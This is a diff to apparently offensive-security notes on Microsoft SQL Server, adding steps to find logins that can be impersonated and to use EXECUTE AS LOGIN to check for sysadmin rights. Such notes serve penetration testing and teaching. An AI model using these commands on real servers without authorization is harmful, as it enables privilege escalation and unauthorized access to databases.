@@ -107,8 +107,18 @@ Identify users we can impersonate:
 3> INNER JOIN sys.server_principals b
 4> ON a.grantor_principal_id = b.principal_id
 5> WHERE a.permission_name = 'IMPERSONATE'
-6> GO
+6> GO #Output will be a list of user we can impersonate
 ```
+
+Impersonating as other user:
+```
+1> EXECUTE AS LOGIN = '<username>'
+2> SELECT SYSTEM_USER
+3> SELECT IS_SRVROLEMEMBER('sysadmin') #Confirm sysadmin member status
+4> GO
+#If user we are impersonating don't have access to current DB we are in, error will be presented, in such case we can move to master db first by typing USE master
+```
+
 
 
 
